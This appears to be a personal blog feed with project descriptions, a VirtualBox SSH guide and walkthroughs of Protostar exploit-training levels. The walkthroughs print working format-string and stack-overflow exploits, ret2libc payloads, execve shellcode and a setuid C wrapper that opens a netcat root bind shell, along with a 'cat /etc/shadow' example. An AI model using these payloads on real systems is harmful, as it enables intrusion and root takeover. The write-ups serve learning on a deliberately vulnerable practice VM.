<p>Languages &amp; Tools
: C++, Scala</p>

<p>Other
: Over the winter break of my freshman year (January 2012), I worked on these in C++. I&rsquo;ll admit that I&rsquo;m a bit embarrassed of the code I wrote &mdash; C++ isn&rsquo;t the greatest language to use to work on these problems. However, Project Euler is a great way to become familiar with a language. The problems become significantly harder, and I continued with Scala (June 2012 &ndash; August 2012).</p>

<p>Links
: <a href="https://github.com/louisrli/project-euler">code solutions</a></p>

<p><a id="grabrc" style="visibility:hidden;"> </a></p>

<h3>.grabrc</h3>

<p>Description
: A command-line client for downloading dotfiles from Github, giving a comfortable editing environment from any terminal. It can be installed via <a href="http://www.pip-installer.org/en/latest/">pip</a> (<code>pip install grabrc-client</code>).</p>

<p>Languages &amp; Tools
: Python (client), Scala Play Framework (server)</p>

<p>Other
: This was a pretty significant endeavor over the summer. The idea was motivated by my work with Amazon EC2 machines, virtual machines, and random in-house servers. Many times, I had to do work while ssh&rsquo;d to those machines, but it was less productive without my comfortable shell and emacs environment at hand. sftp&#8217;ing files is a bit tedious, so I wrote a client (command-line Python) and a server (RESTful API) for accessing my dotfiles. The server is currently hosted on Heroku. I do, in fact, eat my own dog food, and it&rsquo;s very handy when setting up new computers.</p>

<p>Links
: <a href="https://github.com/louisrli/grabrc-server">server source code</a>, <a href="https://github.com/louisrli/grabrc-client">client source code</a>, <a href="http://pypi.python.org/pypi/grabrc-client/">PyPI index</a></p>

<p><a id="shuttleboy" style="visibility:hidden;"> </a></p>

<h3>Shuttleboy iOS</h3>

<p>Description
: A native iOS version of the Harvard shuttle tracker, <a href="http://shuttleboy.cs50.net/">Shuttleboy</a>.</p>

<p>Languages &amp; Tools
: Objective-C, Cocoa Touch</p>

<p>Other
: I worked on this for a few weeks during the winter break of my freshman year (January 2012). I didn&rsquo;t want to pay for Apple Developer membership on my own, but after a long wait, I&rsquo;m planning to release it through Rover soon.</p>

<p>Links
: <a href="http://louisrli.github.io/images/shuttleboy-preview.png">screenshots</a></p>

<p><a id="shuttlebaby" style="visibility:hidden;"> </a></p>

<h3><a href="http://www.hcs.harvard.edu/~louis/shuttlebaby/">Shuttlebaby</a></h3>

<p>Description
: A website with the next few times between two particular stops on <a href="http://shuttleboy.cs50.net/">Shuttleboy</a>. Can be forked and customized.</p>

<p>Languages &amp; Tools
: PHP, HTML, CSS</p>

<p>Links
: <a href="http://www.hcs.harvard.edu/~louis/shuttlebaby/">site</a>, <a href="https://github.com/louisrli/shuttlebaby">source code</a></p>

<p><a id="hungry" style="visibility:hidden;"> </a></p>

<h3><a href="http://www.hcs.harvard.edu/~louis/hungry/">Hungry</a></h3>

<p>Description
: A website with an obnoxiously concise version of the Harvard dining menu, showing only entrees. Includes an option to sign up and receive daily emails.</p>

<p>Languages &amp; Tools
: PHP, HTML, CSS</p>

<p>Links
: <a href="http://www.hcs.harvard.edu/~louis/hungry/">site</a>, <a href="https://github.com/louisrli/hungry">source code</a></p>

<h3>Jenkins Arbitrary Parameters Plugin</h3>

<p>Description
: A plugin for the open-source continuous integration tool [Jenkins] that allows an arbitrary number of string parameters to be passed in as key-value pairs in properties file format.</p>

<p>Languages &amp; Tools
: Java, Jenkins</p>

<p>Other
: Over the summer, one of my first intern projects was constructing a parameterized test framework in Jenkins that would run jobs along a matrix of parameters: operating system, MySQL version, log4cpp version, Java version, etc. Along with some work on the ec2-plugin, this was my first time looking at such a huge codebase. After poking around the Javadocs and Confluence wiki for a substantial amount of time, I wrote this plugin.</p>

<p>Links
: <a href="https://github.com/louisrli/arbitrary-parameters-plugin">source code</a></p>

<p><a id="louisrligithub" style="visibility:hidden;"> </a></p>

<h3><a href="http://louisrli.github.com">louisrli.github.com</a></h3>

<p>Description
: This site.</p>

<p>Languages &amp; Tools
: Customized Twitter Bootstrap (HTML/CSS/Javascript), Jekyll, Markdown</p>

<p>Links
: <a href="https://github.com/louisrli/louisrli.github.com">source code</a>, <a href="http://louisrli.github.com/">site</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Looking Forward to Discrete Mathematics]]></title>
    <link href="http://louisrli.github.io/blog/2012/12/22/discrete-math-paper/"/>
    <updated>2012-12-22T00:00:00-05:00</updated>
    <id>http://louisrli.github.io/blog/2012/12/22/discrete-math-paper</id>
    <content type="html"><![CDATA[<p>For one of my math classes this semester (Sets and Topology), we had a short project: a three-to-five page paper on some area in mathematics. I opted for discrete mathematics, which is a topic on the broad side; five pages, of course.</p>

<!-- more -->


<p>The target audience was supposed to be other students in the course, and the paper should help students decide whether they would pursue the given area of mathematics.</p>

<p>I found this project surprisingly pleasant. Here&rsquo;s <a href="https://www.dropbox.com/s/o1dalrrvstz0u7g/math101-final-paper.pdf">a link to the paper</a>.</p>

<h2>Course assisting</h2>

<p>I&rsquo;m going to be a course assistant for a one-week winter break course on discrete math. I&rsquo;m very excited to return this year to teach, having been a student of the course last year.It&rsquo;s a fast-paced, active learning course that covers 10 modules (topics), two per day. I&rsquo;ll be preparing and presenting the logic module. I&rsquo;ve recently been converted into a believer for active learning.</p>

<p>Discrete math!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Enabling VirtualBox SSH on IPv6 (Linux host, Linux guest)]]></title>
    <link href="http://louisrli.github.io/blog/2012/08/30/virtualbox-ipv6-ssh/"/>
    <updated>2012-08-30T00:00:00-04:00</updated>
    <id>http://louisrli.github.io/blog/2012/08/30/virtualbox-ipv6-ssh</id>
    <content type="html"><![CDATA[<p>This is a quick article describing how to SSH to a VirtualBox machine from the host machine, written for VirtualBox 4.1.18 Fedora. The standard choice &mdash; bridged networking &mdash; doesn&rsquo;t work when the host has an IPv6 address.</p>

<!-- more -->


<p></p>

<p>According to the help page for <strong>bridged networking</strong> (the standard choice):</p>

<blockquote><p>On Linux hosts &hellip; for other protocols such as IPv6 and IPX, you must choose a wired interface.</p></blockquote>

<p>I moved into the dorms yesterday, where I was hit by an IPv6 address and found that I couldn&rsquo;t SSH to one of my VMs. After playing around and finding the solution, I thought I&rsquo;d write a guide since I hadn&rsquo;t found one immediately on the internet.</p>

<h2>0. Install OpenSSH (Guest)</h2>

<p>Make sure the SSH server is installed:</p>

<div>
  <pre><code class='console'>$ sudo apt-get install openssh-server  # Ubuntu, Debian
$ sudo yum install openssh-server   # Fedora</code></pre>
</div>


<h2>1. Create a host-only network (Host)</h2>

<p>Navigate to <strong>File &ndash;> Preferences &ndash;> Network</strong>, and click the icon with a plus sign. By default, it will create a host network named <code>vboxnet0</code>.</p>

<p><img src="http://louisrli.github.io/images/vbox-ssh-hostnetwork.png" alt="File -&gt; Preferences -&gt; Network -&gt; Add Host Network" /></p>

<h2>2. Add a network adapter (Host)</h2>

<p>On the host, first shut off the guest VM. Next, right-click the VM in the library and open the settings. We&rsquo;ll create a second adapter (&ldquo;Adapter 2&rdquo;) attached to a <strong>Host-only Adapter</strong>, as shown in the picture below.</p>

<p><img src="http://louisrli.github.io/images/vbox-ssh-networkadapter.png" alt="Settings -&gt; Network -&gt; Adapter 2 -&gt; Host-only Adapter" /></p>

<h2>3. Add a network interface (Guest)</h2>

<p>On the Linux guest, add the following lines to <code>/etc/network/interfaces</code>:</p>

<div>
  <pre><code class='text'>auto eth1
iface eth1 inet dhcp</code></pre>
</div>


<p>Start the network interface:</p>

<div>
  <pre><code class='console'>$ sudo ifup eth1</code></pre>
</div>


<h2>4. Find the IP address (Guest)</h2>

<p>On the Linux guest, run the <code>ifconfig</code> command and search for the <code>inet addr</code>. In the output below, the address that we need is <strong>192.168.56.101</strong>.</p>

<div>
  <pre><code class='console'>$ ifconfig | grep eth1 -C 5
RX packets:25 errors:0 dropped:0 overruns:0 frame:0
TX packets:33 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:1000
RX bytes:3700 (3.6 KiB)  TX bytes:2867 (2.7 KiB)

eth1      Link encap:Ethernet  HWaddr 08:00:27:32:ac:fd
inet addr:192.168.56.101  Bcast:192.168.56.255  Mask:255.255.255.0
inet6 addr: fe80::a00:27ff:fe32:acfd/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:7963 errors:0 dropped:0 overruns:0 frame:0
TX packets:4691 errors:0 dropped:0 overruns:0 carrier:0</code></pre>
</div>


<h2>5. SSH to the virtual machine (Host)</h2>

<p>Finally, we can SSH to the virtual machine.</p>

<div>
  <pre><code class='console'>$ ssh user@192.168.56.101</code></pre>
</div>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Protostar Format String Exploits (Solutions 0-4)]]></title>
    <link href="http://louisrli.github.io/blog/2012/08/29/protostar-format0/"/>
    <updated>2012-08-29T00:00:00-04:00</updated>
    <id>http://louisrli.github.io/blog/2012/08/29/protostar-format0</id>
    <content type="html"><![CDATA[<h1>Overview</h1>

<p><strong>Protostar</strong> is a series of exercises from <a href="http://exploit-exercises.com/protostar">Exploit Exercises</a>. In addition to three final levels, it has four basic sections: network programming, format strings, heap overflows, and stack overflows.</p>

<p>This post contains solutions and walkthroughs for the four format string levels (&ldquo;Format&rdquo;).</p>

<h1>Solutions</h1>

<h2>Format: Level 0</h2>

<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format0">full</a>): Change the value of a stack variable to <code>0xdeadbeef</code> using less than 10 bytes of input.</p>

<p>This exploit shows similarities (sometimes) between format string exploits and buffer overflows.</p>

<div>
  <pre><code class='console'>$ ./format0 %64s$(perl -e 'print &quot;\xef\xbe\xad\xde&quot;')

you have hit the target correctly :)</code></pre>
</div>




<!-- more -->


<h2>Format: Level 1</h2>

<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format1">full</a>): Change the value of a global variable, <code>target</code>, to any nonzero value.</p>

<p><code>target</code> is a global variable. To overwrite it, we first find its address using <code>obdjump -t</code> (we could also use <code>nm</code> to save some keystrokes).</p>

<div>
  <pre><code class='console'>$ objdump -t format1 | grep target
08049638 g       0 .bss    00000004            target</code></pre>
</div>


<p>Next, we need to find where the format function expects the first (missing) argument to the format string.</p>

<div>
  <pre><code class='text'>Starting program: /opt/protostar/bin/format1 AAAA%08x

Breakpoint 1, __printf (format=0xbffff98f &quot;AAAA%08x&quot;) at printf.c:29
29      printf.c: No such file or directory.
in printf.c
(gdb) x/10xw $esp
0xbffff768:     0x00000002      0xb7edcf90      0xb7edcf99      0xb7fd6ff4
0xbffff778:     0xbffff798      0x08048405      0xbffff98f      0x0804960c
0xbffff788:     0xbffff7b8      0x08048469
(gdb) x/xw 0xbffff784
0xbffff784:     0x0804960c
(gdb) p 0xbffff98f - 0x0bffff784
$1 = 523</code></pre>
</div>


<p>An important detail: adding <em>n</em> characters will actually decrease the starting address of the string&rsquo;s characters by <em>n</em> bytes. Adding one more character decrements the address from <code>0xbffff98f</code> to <code>0xbffff98e</code>. This leaves the location of the first parameter unchanged.</p>

<p>Remember that the offset is calculated <em>relative to the format function</em> (i.e. <code>printf</code>) rather than <code>vuln()</code>.</p>

<div>
  <pre><code class='text'>(gdb) run AAAAA%08x
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /opt/protostar/bin/format1 AAAAA%08x

Breakpoint 1, __printf (format=0xbffff98e &quot;AAAAA%08x&quot;) at printf.c:29
29      printf.c: No such file or directory.
in printf.c
(gdb) x/xw 0xbffff784
0xbffff784:     0x0804960c</code></pre>
</div>


<ul>
<li><code>0xbffff784</code>: The first argument to the format string.</li>
<li><code>0xbffff997 - n</code>: The first character of the format string, where <code>n</code> is the total number of characters in the string. The odd alignment is caused by the null byte.</li>
</ul>


<p>As seen earlier, the distance between the beginning of the format string (the address of <code>target</code>) and the first argument to the format string (a starting address for &ldquo;stack popping&rdquo; additional arguments) is about 500 bytes.</p>

<p>With a few calculations, we can find the correct offset.</p>

<div>
  <pre><code class='console'>$ ./format1 $(perl -e 'print &quot;\x38\x96\x04\x08&quot;')'..%128$n'
8..you have modified the target :)</code></pre>
</div>


<h2>Format: Level 2</h2>

<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format3">full</a>): Change the value of a global variable, <code>target</code>, to <code>0x40</code>.</p>

<div>
  <pre><code class='console'>$ objdump -t format2 | grep target
080496e4 g     O .bss   00000004              target</code></pre>
</div>


<p>Using the same techniques as before, we find the beginning of the format string in memory. The fourth expected format string argument coincides with the beginning of the format string in memory. We store our target address at the beginning of the format string in order to write to it.</p>

<div>
  <pre><code class='console'>$ echo -ne $(perl -e 'print &quot;\xe4\x96\x04\x08&quot;')%4\$08x | ./format2
080496e4target is 0 :(</code></pre>
</div>


<p>Finally, we calculate the number of bytes needed to write 64 (0x40). The address of <code>target</code> occupies four bytes first, and we need another 60 bytes.</p>

<div>
  <pre><code class='console'>$ echo -ne $(perl -e 'print &quot;\xe4\x96\x04\x08&quot;')%60u%4\$n | ./format2
                                                         512you have modified the target :)</code></pre>
</div>


<h2>Format: Level 3</h2>

<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format3">full</a>): Change the value of a global variable, <code>target</code>, to <code>0x01025544</code>.</p>

<div>
  <pre><code class='console'>$ objdump -t format3 | grep target
080496f4 g     O .bss   00000004              target</code></pre>
</div>


<p>We calculate the offset between the format function parameters and the characters of the string in the same way as the previous exercises.</p>

<div>
  <pre><code class='text'>(gdb) break printf
Breakpoint 1 at 0x804837c
(gdb) run
Starting program: /opt/protostar/bin/format3
AAAA
Breakpoint 1, __printf (format=0xbffff5a0 &quot;AAAA\n&quot;) at printf.c:29
29      printf.c: No such file or directory.
in printf.c
(gdb) info frame
Stack level 0, frame at 0xbffff570:
eip = 0xb7edcfa2 in __printf (printf.c:29); saved eip 0x8048465
called by frame at 0xbffff590
source language c.
Arglist at 0xbffff568, args: format=0xbffff5a0 &quot;AAAA\n&quot;
Locals at 0xbffff568, Previous frame's sp is 0xbffff570
Saved registers:
ebx at 0xbffff564, ebp at 0xbffff568, eip at 0xbffff56c
(gdb) x/3xw 0xbffff568
0xbffff568:     0xbffff588      0x08048465      0xbffff5a0
(gdb) x/w 0xbffff570
0xbffff570:     0xbffff5a0
(gdb) p 0xbffff5a0 - 0xbffff570
= 48</code></pre>
</div>


<p>We can confirm that our offset of 48 (12 * 4 bytes) is correct.</p>

<div>
  <pre><code class='console'>$ echo AAAA%12\$x | ./format3
AAAA41414141
target is 00000000 :(</code></pre>
</div>


<p>Next, we need to change the value of target to <code>0x01025544</code>. Below is each byte in decimal:</p>

<div>
  <pre><code class='console'>$ echo &quot;ibase=16; 44&quot; | bc
68
$ echo &quot;ibase=16; 55&quot; | bc
85
$ echo &quot;ibase=16; 02&quot; | bc
2
$ echo &quot;ibase=16; 01&quot; | bc
1</code></pre>
</div>


<p>Finally, we write values to each of the four bytes of <code>target</code>:</p>

<div>
  <pre><code class='console'>$ echo $(perl -e 'print &quot;\xf4\x96\x04\x08&quot;')$(perl -e 'print &quot;\xf5\x96\x04\x08&quot;')$(perl -e 'print &quot;\xf6\x96\x04\x08&quot;')$(perl -e 'print &quot;\xf7\x96\x04\x08&quot;')'%52u%12$n%''17u%13$n''%173u%14$n' | ./format3
���                                                   0       3221222848                                                                                                                                                                   3086839796
you have modified the target :))</code></pre>
</div>


<p>Note that it wasn&rsquo;t necessary to include the last address, <code>0x080496f7</code>, since the most significant byte (<code>0x01</code>) is written as a consequence of the overflow.</p>

<h2>Format: Level 4</h2>

<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/format4">full</a>): Redirect execution flow to <code>hello()</code> by using a format string exploit.</p>

<p>In this exercise, the offset is only 16 bytes (four parameter arguments). The calculation is omitted as the two previous exercises illustrate the process.</p>

<div>
  <pre><code class='console'>$ echo 'AAAA%4$x' | ./format4
AAAA41414141</code></pre>
</div>


<p>In order to perform this exploit, we&rsquo;ll <a href="http://www.stanford.edu/~stinson/cs155/rdg/rdg_list.txt">overwrite an entry in global offset table</a>. Specifically, we&rsquo;ll overwrite the entry of the <code>exit()</code> function (<code>0x08049724</code>) with the address of the <code>hello()</code> function (<code>0x08048b4</code>).</p>

<div>
  <pre><code class='console'>$ objdump -TR format4 | grep exit
00000000      DF *UND* 00000000  GLIBC_2.0   _exit
00000000      DF *UND*  00000000  GLIBC_2.0   exit
08049718 R_386_JUMP_SLOT   _exit
08049724 R_386_JUMP_SLOT   exit
$ objdump -t format4 | grep hello
080484b4 g     F .text  0000001e              hello</code></pre>
</div>


<p>To confirm that our overwrite works correctly, we run a quick test:</p>

<div>
  <pre><code class='console'>$ echo $(perl -e 'print &quot;\x24\x97\x04\x08&quot;')'%4$n' &gt; /tmp/format4
$ gdb -q format4
Reading symbols from /opt/protostar/bin/format4...done.
(gdb) run &lt; /tmp/format4
Starting program: /opt/protostar/bin/format4 &lt; /tmp/format4
$�
Program received signal SIGSEGV, Segmentation fault.
0x00000004 in ?? ()</code></pre>
</div>


<p>Execution jumped to the address <code>0x00000004</code>, meaning that we&rsquo;re on the right track. Finally, we use a <strong>short write</strong> (<code>%hn</code>, allowing us to write to two bytes) to overwrite the last two bytes of the GOT entry. This works because both addresses start with <code>0x0804</code> &mdash; only the last two bytes need to be changed.</p>

<div>
  <pre><code class='console'>$ echo $(perl -e 'print &quot;\x24\x97\x04\x08&quot;')'%33968u%4$hn' | ./format4
$
&lt;lots of whitespace&gt;
512
                                                                                                                                                                              code execution redirected! you win</code></pre>
</div>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Protostar Stack Exploits (Solutions 6-7)]]></title>
    <link href="http://louisrli.github.io/blog/2012/08/28/protostar-stack2/"/>
    <updated>2012-08-28T00:00:00-04:00</updated>
    <id>http://louisrli.github.io/blog/2012/08/28/protostar-stack2</id>
    <content type="html"><![CDATA[<h1>Overview</h1>

<p><strong>Protostar</strong> is a series of exercises from <a href="http://exploit-exercises.com/protostar">Exploit Exercises</a>. In addition to three final levels, it has four basic sections: network programming, format strings, heap overflows, and stack overflows.</p>

<p>This series of posts contains solutions and walkthroughs for the stack overflow levels (&ldquo;Stack&rdquo;). It assumes basic knowledge of systems programming and is meant to serve as a reference for those stuck on certain levels. This is the final post for Stack.</p>

<h1>Solutions</h1>

<h2>Stack 6</h2>

<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack6">full</a>): Execute shellcode with a restriction on the return address. This mimics a nonexecutable stack by barring any return addresses of the form <code>0xbfxxxxxx</code>.</p>

<h3>Utilities</h3>

<p>We&rsquo;ll add one more script to our utility belt. This will help us quickly make guesses for buffer overflows.</p>

<p><code>~/try-address.sh</code>:</p>

<div>
  <pre><code class='bash'>#!/bin/bash
# Takes an offset and unlimited 4-byte addresses and prints it in little-endian order
if [[ $# -lt 2 ]]; then
    echo &quot;usage: $0 OFFSET ADDRESS. Example: $0 80 0xdeadbeef 0xf00f00f0&quot;
    exit 1
fi

perl -e &quot;print 'A'x$1&quot;
shift
for addr in $@; do
    for i in $(seq 8 -2 2); do echo -ne &quot;\x${addr:$i:2}&quot;; done
done</code></pre>
</div>




<!-- more -->


<h3>Solution</h3>

<p>First, we need to find the proper offset for overwriting the return address. The command below reveals that the return address is 16 bytes after the end of the 64 byte buffer, meaning that 80 bytes are needed before overwriting the return address.</p>

<div>
  <pre><code class='console'>$ for i in $(seq 76 4 100); do echo $i; ~/try-address.sh $i 0xbfffffff | ./stack6; done
76
...
80
input path please: bzzzt (0xbfffffff)
84
...</code></pre>
</div>


<p>For our solution, we&rsquo;ll be performing a <strong><a href="http://en.wikipedia.org/wiki/Return-to-libc_attack">ret2libc</a></strong> attack. <a href="http://shellblade.net/docs/ret2libc.pdf">This paper</a> by InVoLuNTaRy offers an in-depth description of the tactic (sidenote: it&rsquo;s one of the most well-written papers that I&rsquo;ve ever read and well worth the read). The rest of this section assumes that this paper has been read.</p>

<p>First, we find the addresses of the <code>system()</code> and <code>exit()</code> libc functions. <code>exit()</code> isn&rsquo;t strictly necessary, but since ret2libc ultimately calls two functions, we prefer to return without a segmentation fault.</p>

<div>
  <pre><code class='console'>$ gdb -q stack6
Reading symbols from /opt/protostar/bin/stack6...done.
(gdb) break main
Breakpoint 1 at 0x8048500: file stack6/stack6.c, line 27.
(gdb) run
Starting program: /opt/protostar/bin/stack6

Breakpoint 1, main (argc=1, argv=0xbffff874) at stack6/stack6.c:27
27      stack6/stack6.c: No such file or directory.
in stack6/stack6.c
(gdb) print system
$1 = {&lt;text variable, no debug info&gt;} 0xb7ecefb0 &lt;__libc_system&gt;
(gdb) print exit
$2 = {&lt;text variable, no debug info&gt;} 0xb7ec50c0 &lt;*__GI_exit&gt;</code></pre>
</div>


<p>We see that our functions have the following addresses:</p>

<ul>
<li><code>system()</code>: <code>0xb7ecefb0</code></li>
<li><code>exit()</code>: <code>0xb7ec50c0</code></li>
</ul>


<p>Given the particular stack layout for a ret2libc attack (described in the InVoLuNTaRy paper), our solution will be of the form:</p>

<div>
  <pre><code class='console'>$ ~/try-address.sh 80 (ENV_VAR_ADDRESS) (EXIT()_ADDRESS) (SYSTEM()_ADDRESS)</code></pre>
</div>


<h4>Sanity checks</h4>

<p>First, let&rsquo;s make sure that we can actually execute code.</p>

<div>
  <pre><code class='console'>$ export TEST=whoami
$ /home/user/try-address.sh 80 0xb7ecefb0 0xb7ec50c0 0xbfffff8a | ./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA���P췊���
sh: =whoami: not found
$ /home/user/try-address.sh 80 0xb7ecefb0 0xb7ec50c0 0xbfffff8b | ./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA���P췋���
root</code></pre>
</div>


<h4>Working netcat solution</h4>

<p>There are two obstacles to a working solution.</p>

<ol>
<li>Environmental variables with spaces don&rsquo;t work. All of the following would fail:</li>
</ol>


<div>
  <pre><code class='console'>$ export RUN=&quot;nc -lp8080 -e/bin/sh&quot;
$ export RUN=&quot;cat /etc/shadow&quot;
$ export RUN=&quot;\&quot;cat /etc/shadow\&quot;&quot;</code></pre>
</div>


<ol>
<li><code>system()</code> will drop our root privileges (<a href="http://linux.die.net/man/3/system">man system</a>)</li>
</ol>


<p>Instead, we can wrap our call to netcat in another C program, naming an executable without spaces and restoring our privileges.</p>

<div>
  <pre><code class='c'>#include &lt;stdlib.h&gt;

int main(int argc, char **argv, char **envp) {
    setuid(0); // These two are necessary, as system() drops privileges
    setgid(0);
    char *args[] = {  &quot;nc&quot;, &quot;-lp8080&quot;, &quot;-e/bin/sh&quot;, (char *) 0 };
    execve(&quot;/bin/nc&quot;, args, envp);
}</code></pre>
</div>




<div>
  <pre><code class='console'>$ gcc ~/netcat.c -o ~/netcat
$ export RUN=/////////////////////////////////////home/user/netcat   # The slashes are similar to a NOP sled
$ ~/envaddr RUN
RUN is at address 0xbfffff9e
$ /home/user/try-address.sh 80 0xb7ecefb0 0xb7ec50c0 0xbfffff9e | ./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA���P췞���
sh: 192.168.1.10: not found</code></pre>
</div>


<p><code>system()</code> doesn&rsquo;t seem to be using the contents of our environmental variable. If we look at the environmental variables, though, we see that we were close enough: <code>RUN</code> is the next variable. We then adjust our estimate for the address of <code>RUN</code> by 20 bytes.</p>

<div>
  <pre><code class='console'>$ env
...
HOME=/home/user
LOGNAME=user
SSH_CONNECTION=192.168.1.7 49324 192.168.1.10 22
RUN=/////////////////////////////////////home/user/netcat
_=/usr/bin/env
$ /home/user/try-address.sh 80 0xb7ecefb0 0xb7ec50c0 0xbfffffbe | ./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA���P췳���
&lt;waiting&gt;</code></pre>
</div>


<p>Finally, through a remote machine:</p>

<div>
  <pre><code class='console'>$[louis@neutrino ~]$ nc 192.168.1.10 8080
whoami
root</code></pre>
</div>


<h2>Stack: Level 7</h2>

<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack7">full</a>): Execute shellcode with further restrictions on the return address. Any address of the form <code>0xbxxxxxxx</code> raises an error.</p>

<h3>Overview</h3>

<p>The return value of a function is usually stored in the <code>eax</code> register. The key to this level is the call to <code>return strdup(buf)</code>: this means we can find the buffer (e.g. our shellcode) in the <code>eax</code> register when <code>getpath()</code> returns.</p>

<p>The code restricts us from returning to any code on the bottom of the stack (<code>0xbxxxxxxx</code>) and advises us to return to the <code>.text</code> section. In particular, we&rsquo;ll want to return to a <code>call eax</code> instruction, which will then call our shellcode.</p>

<div>
  <pre><code class='console'>$ objdump -M intel -d stack7 | grep &quot;call.*eax&quot;
8048478:       ff 14 85 5c 96 04 08    call   DWORD PTR [eax*4+0x804965c]
80484bf:       ff d0                   call   eax
80485eb:       ff d0                   call   eax</code></pre>
</div>


<p>If we play with the numbers like in earlier levels, we&rsquo;ll find that 80 bytes are needed before the return address. Our buffer overflow will look like this:</p>

<div>
  <pre><code class='text'>Buffer start
      | ---------- Shellcode (n bytes) --------- |
      | -------- Padding (80 - n bytes) -------- |
      | -- Return address 0x80484bf (4 bytes) -- |
Buffer end (84 bytes total)</code></pre>
</div>


<h3>Solution</h3>

<p>In earlier levels, we found that opening a shell with <code>gets()</code>. However, we can still use it to validate our strategy:</p>

<div>
  <pre><code class='console'>$ echo -ne $(cat ~/shell)$(~/try-address.sh 49 0x080484bf) | wc -c
84
$ echo -ne $(cat ~/shell)$(~/try-address.sh 49 0x080484bf) &gt; /tmp/stack7shell
$ gdb -q stack7
Reading symbols from /opt/protostar/bin/stack7...done.
(gdb) run &lt; /tmp/stack7shell
Starting program: /opt/protostar/bin/stack7 &lt; /tmp/stack7shell
input path please: got path ����1�Ph//shh/bin��h-ilsP�̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAA�AAAAAAAAAAAA��
Executing new program: /bin/dash

Program exited normally.</code></pre>
</div>


<p>If we give it a shot with our <code>nc</code> shellcode, we&rsquo;ll find the following error: <code>bin/sh: forward host lookup failed: Unknown host</code>. This occurs as a complication from having options passed into the <code>execve</code> call.</p>

<p>We can add another wrapper to the <code>netcat.c</code> used in Level 6 by writing our own shellcode. This shellcode will simply execute <code>/tmp/nc</code>, an alias for a compiled <code>netcat.c</code>. This file, in turn, calls netcat and listens via port 8080.</p>

<p><code>~/sc-tmp-nc.asm</code>:</p>

<div>
  <pre><code class='nasm'>BITS 32

xor eax, eax
push eax
push 0x636e2f2f         ; //nc
push 0x706d742f         ; /tmp
mov ebx, esp
push eax
mov edx, esp
push ebx
mov ecx, esp
mov al, 11              ; execve()
int 0x80</code></pre>
</div>




<div>
  <pre><code class='console'>$ nasm ~/sc-tmp-nc.asm
$ gcc ~/netcat.c -o ~/netcat
$ cp /home/user/netcat /tmp/nc
$ cat /home/user/sc-tmp-nc | wc -c
25
got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��
$ echo -ne $(cat ~/sc-tmp-nc)$(~/try-address.sh 55 0x080484bf) | ./stack7
input path please: got path 1�Ph//nch/tmp���̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�AAAAAAAAAAAA��
&lt;waiting&gt;</code></pre>
</div>


<p>On a remote machine:</p>

<div>
  <pre><code class='console'>$[louis@neutrino ~]$ nc 192.168.1.10 8080
whoami
root</code></pre>
</div>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Protostar Stack Exploits (Solutions 4-5)]]></title>
    <link href="http://louisrli.github.io/blog/2012/08/24/protostar-stack1/"/>
    <updated>2012-08-24T00:00:00-04:00</updated>
    <id>http://louisrli.github.io/blog/2012/08/24/protostar-stack1</id>
    <content type="html"><![CDATA[<h1>Overview</h1>

<p><strong>Protostar</strong> is a series of exercises from <a href="http://exploit-exercises.com/protostar">Exploit Exercises</a>. In addition to three final levels, it has four basic sections: network programming, format strings, heap overflows, and stack overflows.</p>

<p>This series of posts contains solutions and walkthroughs for the stack overflow levels (&ldquo;Stack&rdquo;). It assumes basic knowledge of systems programming and is meant to serve as a reference for those stuck on certain levels. This is the second of three posts for Stack.</p>

<h1>Solutions</h1>

<h2>Stack: Level 4</h2>

<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack4">full</a>): Overwrite the <a href="http://en.wikibooks.org/wiki/X86_Assembly/X86_Architecture#Instruction_Pointer">eip register</a> to change execution flow.</p>

<p>First, we want to find the offset to the return address. We can explore using gdb and a breakpoint on <code>main</code>.</p>

<div>
  <pre><code class='console'>$ gdb ./stack4</code></pre>
</div>




<!-- more -->


<div>
  <pre><code class='text'>(gdb) break main
Breakpoint 1 at 0x8048411: file stack4/stack4.c, line 15.
(gdb) run
Starting program: /opt/protostar/bin/stack4

Breakpoint 1, main (argc=1, argv=0xbffff874) at stack4/stack4.c:15
15      stack4/stack4.c: No such file or directory.
in stack4/stack4.c
(gdb) next
AAAA
16      in stack4/stack4.c
(gdb) info frame
Stack level 0, frame at 0xbffff7d0:
eip = 0x804841d in main (stack4/stack4.c:16); saved eip 0xb7eacc76
source language c.
Arglist at 0xbffff7c8, args: argc=1, argv=0xbffff874
Locals at 0xbffff7c8, Previous frame's sp is 0xbffff7d0
Saved registers:
ebp at 0xbffff7c8, eip at 0xbffff7cc
(gdb) x/32xw $esp
0xbffff770:     0xbffff780      0xb7ec5165      0xbffff788      0xb7eaca75
0xbffff780:     0x41414141      0x08049500      0xbffff798      0x080482e8
0xbffff790:     0xb7ff1040      0x080495ec      0xbffff7c8      0x08048449
